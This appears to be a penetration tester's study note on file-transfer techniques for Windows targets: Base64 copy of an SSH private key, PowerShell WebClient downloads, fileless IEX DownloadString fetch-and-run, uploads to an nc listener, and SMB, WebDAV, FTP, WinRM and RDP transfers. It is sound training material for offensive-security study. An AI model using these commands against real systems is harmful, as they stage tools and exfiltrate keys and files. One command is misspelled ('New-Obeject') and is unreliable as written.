```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
Sometimes to bypass defences and detection mechanisms, we need to use various methods (sometimes in-conjunction with one another) to transfer files to/from a target system.

## PowerShell Base64 Encode & Decode
- We can encode a payload as Base64, copy and paste it to the other system (eg. via a terminal), and decode it on the system
- Doesn't require any network communication to transfer the file (only shell connection)
- It is important to check the hash of the payload on both sides to ensure its transferred correctly (eg. MD5)
- *CMD is limited to 8191 characters, so this will not work for larger files*

**Example transferring an SSH key**
1. Check hash of key : `md5sum id_rsa`
2. Encode key : `cat id_rsa | base64; echo`
3. Copy contents to target machine
4. Use PowerShell to decode : `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64_string>"))`
5. Confirm hash : `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

The same Base64 techniques can be used to upload files to a web server
```PowerShell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<File Path>' -Encoding Byte))
Invoke-WebRequest -Uri '<Webserver Address>' -Method POST -Body $b64
```

We can listen on a port with `nc` to catch the incoming request and the data.
```bash
nc -lvnp 4444
```

## PowerShell Web Downloads
- Most companies allow *HTTP* and *HTTPS* traffic through the firewall.
- Web filtering could still prevent access to certain websites, or block certain file type downloads etc
- The [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over *HTTP* (80), *HTTPS* (443), or *FTP* (21). The methods can be seen below:

| Method                                                                                                                   | Description                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
```Powershell
# Download a file
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Location>')

# Fileless download (Doesn't write to disk, executes directly from memory using Invoke-Expression [IEX])
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX

# PowerShell 3.0+ can use Invoke-WebRequest (Alias: iwr, curl, wget)
Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Location>'
# -UseBasicParsing can be used if there are IE engine problems

# If there is issues related to SSL/TLS certs not being trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
[More Examples](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## PowerShell Web Uploads
- PowerShell has no upload function by default but `Invoke-WebRequest` & `Invoke-RestMethod` can be used to build our upload function.
- We will also need a webserver capable of accepting file uploads.

First, create a webserver that is capable of handling file uploads. `uploadserver` is a python HTTP.server module extension for uploads.
```bash
pip3 install uploadserver

python3 -m uploadserver
```

We can then use a tool like [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform upload operations in PowerShell.
```PowerShell
IEX(New-Obeject Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri 'http://<ip>/upload' -File '<File Path>'
```
## SMB Downloads
SMB works on TCP port 445, and can be used to transfer files to a target system.

First we need to create an SMB server to host our payload (we can use Impacket's `smbserver`)
```bash
sudo impacket-smbserver [shareName] -smb2support /tmp/smbshare
```

We can then copy the file to our target system
```batch
copy \\<ip>\share\nc.exe
```
> Sometimes this will be blocked by modern windows systems as guest authentication is disabled. To fix this we can create an SMB server with a username and password.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On the target system, mount and then copy the file
```batch
net use n: \\<ip>\share /user:test test
copy n:\nc.exe
```

## SMB Uploads
Often, companies do not allow SMB connections outside of the internal network as this could open up potential attacks. However, SMB can be used over HTTP & HTTPS. The `WebDav` extension of HTTP enables a webserver to behave like a fileserver. When making an SMB connection to a `WebDav` server, if its initial SMB protocol attempt fails, it will fallback to trying the HTTP protocol.

To setup a `WebDav` server:
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=<ip> --port=80 --root=/tmp --auth=anonymous
```

To then check a connection to the server on the target:
```batch
dir \\<ip>\DavWWWRoot

dir \\<ip>\<sharename>
```
> The *DavWWWRoot* keyword is recognised by the Windows Shell. No folder exists on the server with that name but it tells the Mini-Redirector driver, which handles WebDAV, to connect to the root of the WebDAV server. This keyword can be avoided by specifying a folder that exists on the server.

You can then upload files:
```batch
copy <File Path> \\<ip>\DavWWWRoot\
copy <File Path> \\<ip>\<sharefolder>\
```
> If there are no SMB restrictions on the target network, you can setup a normal SMB server like above for downloading via SMB.
## FTP Downloads
Another alternative is to use port 20/21 for FTP file downloads.

We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By default it uses port *2121* so we can change this. It also has anonymous auth enabled by default too.
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

We can then download it via PowerShell on the target
```PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<Output File Location>')
```

## FTP Uploads
Very similar to the downloading process.

We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By default it uses port *2121* so we can change this. It also has anonymous auth enabled by default too.
> Additionally this time, we need to specify write permissions for users
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

We can then download it via PowerShell on the target
```PowerShell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/file.txt', '<Input File Location>')
```

## PowerShell Remoting
Sometimes HTTP, HTTPS, or SMB are unavailable, so we can use WinRM to perform file transfer. It allows us to execute scripts or commands remotely using PowerShell sessions.

By default it uses:
- HTTP : 5985/tcp
- HTTPS : 5986/tcp

You need to:
- Be an administrator
- Be a member of `Remote Management Users` group or have PowerShell Remoting permissions

```PowerShell
# Test Connection
Test-NetConnection -ComputerName <NAME> -Port 5985

# Create session to remote computer
$Session = New-PSSession -ComputerName <Remote Name>

# Copy a file to remote
Copy-Item -Path <local path> -ToSession $Session -Destination <remote path>

# Copy a file from remote
Copy-Item -Path <remote path> -Destination <local path> -FromSession $Session
```
## Using RDP
You can mount a drive as part of RDP
```bash
xfreerdp /v:10.10.10.132 /d:<domain> /u:<user> /p:<password> /drive:<local path>,<remote path>
```

## Encrypting Files with AES
We can use the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) file to perform AES encryption. We must transfer the script to the target and then import it as a module with:
```PowerShell
Import-Module .\Invoke-AESEncryption.ps1
```
### Encrypting Text
```PowerShell
# Encrypt some text into a Base64 encoded ciphertext
Invoke-AESEncryption -Mode Encrypt -Key "password" -Text "Secret Text"

# Decrypt the Base64 encoded ciphertext
Invoke-AESEncryption -Mode Decrypt -Key "password" -Text "LtxcR...AMfs="
```

### Encrypting Files
```PowerShell
# Encrypt a file and output it as .aes output ext
Invoke-AESEncryption -Mode Encrypt -Key "password" -Path file.bin

# Decrypt the Base64 encoded ciphertext
Invoke-AESEncryption -Mode Decrypt -Key "password" -Path file.bin.aes
```

